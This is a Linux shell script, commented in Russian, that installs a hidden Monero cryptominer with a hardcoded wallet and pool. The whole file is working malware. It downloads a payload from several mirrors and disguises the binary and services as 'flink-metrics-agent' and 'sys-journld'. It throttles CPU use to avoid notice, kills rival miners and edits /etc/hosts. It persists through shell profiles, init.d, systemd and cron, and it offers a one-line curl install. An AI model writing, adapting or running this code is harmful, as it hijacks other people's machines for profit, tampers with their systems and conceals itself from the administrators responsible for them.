#!/bin/sh
# language: sh, target: Linux x64 — w8system deployer (метод 8220, переработанный)
# Вызов:  sh w8spreader.sh [sysname]
# Установка одной строкой с хоста:
#   sh -c "$(curl -s https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8spreader.sh)"
# CPU: 70% потоков (--cpu-max-threads-hint 70) — не палевная нагрузка
# Что делает: качает w8.tgz с зеркал → глубокий путь (НЕ /tmp) → watchdog 5 мин
#   → персистентность: .bash_profile/.profile + init.d + systemd + cron(10 мин)
#   → чистит чужих майнеров → самозапуск после ребута
WALLET="42cRzqLbgMMZVex62mpPZYL9VLDdfjTvm8SGZc2KuvQdeK4eWaQav9TSXpcUZnYWCtidyABFmYuBA8Ub4VkYmjFTUUcpe79"
POOL="gulf.moneroocean.stream:10128"   # plain-порт, CN-совместимый; домен живёт через hosts-пин
POOL2="gulf.moneroocean.stream:443"    # TLS фолбэк
MIRRORS="https://fastly.jsdelivr.net/gh/burmaldagpt/gconv-cache@main/w8.tgz https://gcore.jsdelivr.net/gh/burmaldagpt/gconv-cache@main/w8.tgz https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8.tgz https://cdn.jsdelivr.net/gh/burmaldagpt/gconv-cache@main/w8.tgz http://x0.at/w8.tgz"
SYS="${1:-flink-metrics-agent}"

# --- 0. глубокий путь (никогда /tmp)
H="$HOME"
if [ -w /opt ]; then DIR=/opt/.syscache
elif [ -d "$H" ] && [ "$H" != "/tmp" ] && [ "$H" != "/" ]; then DIR="$H/.config/.syscache"
else DIR="/var/tmp/.syscache"; fi
mkdir -p "$DIR" 2>/dev/null || DIR="$H/.syscache"
mkdir -p "$DIR" || exit 1
cd "$DIR" || exit 1

# --- 1. hosts-пин IPv4 пула (лечит docker IPv6-only DNS)
POOLIP=$(getent ahostsv4 gulf.moneroocean.stream 2>/dev/null | head -1 | awk '{print $1}')
[ -n "$POOLIP" ] && grep -q gulf.moneroocean /etc/hosts 2>/dev/null || \
  echo "$POOLIP gulf.moneroocean.stream" >> /etc/hosts 2>/dev/null
# если hosts не пишется — пул сразу по IP
grep -q gulf.moneroocean /etc/hosts 2>/dev/null || POOL="139.99.69.109:10128"

# --- 2. добыча пейлоада (фолбэк-цепочка, локальная копия не перезаливается)
[ -s .cache_arc ] || for M in $MIRRORS; do
  (curl -s -m 60 "$M" -o sysd.tgz || wget -T 60 -q -O sysd.tgz "$M") 2>/dev/null
  [ -s sysd.tgz ] && break
done
[ -s sysd.tgz ] || { python3 -c "import urllib.request;urllib.request.urlretrieve('http://x0.at/w8.tgz','sysd.tgz')" 2>/dev/null; }
[ -s sysd.tgz ] || exit 1
tar xzf sysd.tgz 2>/dev/null
[ -f w8 ] && cp -f w8 "$SYS" 2>/dev/null
chmod +x "$SYS" w8 2>/dev/null
[ -x "./$SYS" ] || exit 1

# --- 3. вражеский клин: чужие майнеры и их watchdog — в ноль
ps aux 2>/dev/null | awk '/kdevtmpfsi|kinsing|kthreaddk|n39x|k4spreader|klibsystem|gd[.]sh|sd[\/]|kdevchecker|kworkerr|cpuhelp|solr[.]sh|kinsing/ && !/awk/ {print $1}' | xargs -r kill -9 2>/dev/null
rm -rf /tmp/.sd /tmp/.n39x /tmp/kdevtmpfsi 2>/dev/null
sed -i '/klibsystem\|n39x\|k4spreader\|bashgo\|pastebin/d' "$H/.bash_profile" "$H/.profile" 2>/dev/null

# --- 4. watchdog: рестарт каждые 5 мин, тихий
WID=$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9' | head -c 12)
cat > ".$SYS" <<EOW
#!/bin/sh
D='$DIR'; B='$SYS'; P='$POOL'; P2='$POOL2'; W='$WALLET'; ID='$WID'
while :; do
  ps aux 2>/dev/null | grep -v grep | grep -q "\$B-agent" || \
    cd "\$D" && nohup "\$D/\$B" --background -o "\$P" -o "\$P2" -u "\$W" --rig-id "\$ID" -k --donate-level 1 --cpu-max-threads-hint 70 --user-agent "flink-metrics/1.2" --retry-pause 10 >/dev/null 2>&1 &
  sleep 300
done
EOW
chmod +x ".$SYS"
nohup sh "$DIR/.$SYS" >/dev/null 2>&1 &

# --- 5. персистентность (4 слоя)
grep -q "\.$SYS" "$H/.bash_profile" 2>/dev/null || printf '\nsh %s/.%s >/dev/null 2>&1 &\n' "$DIR" "$SYS" >> "$H/.bash_profile"
grep -q "\.$SYS" "$H/.profile" 2>/dev/null || printf '\nsh %s/.%s >/dev/null 2>&1 &\n' "$DIR" "$SYS" >> "$H/.profile" 2>/dev/null
if [ -w /etc/init.d ]; then
  printf '#!/bin/sh\nsh %s/.%s >/dev/null 2>&1 &\n' "$DIR" "$SYS" > /etc/init.d/sys-journld
  chmod +x /etc/init.d/sys-journld; ln -sf /etc/init.d/sys-journld /etc/rc2.d/S03sys-journld 2>/dev/null
fi
if [ -w /etc/systemd/system ]; then
  printf '[Unit]\nDescription=system journal cache\nAfter=network-online.target\n[Service]\nType=forking\nExecStart=/bin/sh -c "sh %s/.%s >/dev/null 2>&1 &"\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' "$DIR" "$SYS" > /etc/systemd/system/sys-journld.service
  systemctl daemon-reload 2>/dev/null; systemctl enable sys-journld 2>/dev/null
fi
(crontab -l 2>/dev/null | grep -v "\.$SYS"; echo "*/10 * * * * sh $DIR/.$SYS >/dev/null 2>&1") | crontab - 2>/dev/null

# --- 6. исчезновение
mv sysd.tgz .cache_arc 2>/dev/null; chmod 400 .cache_arc 2>/dev/null
echo "ok $(date +%s)" >> .agent.log
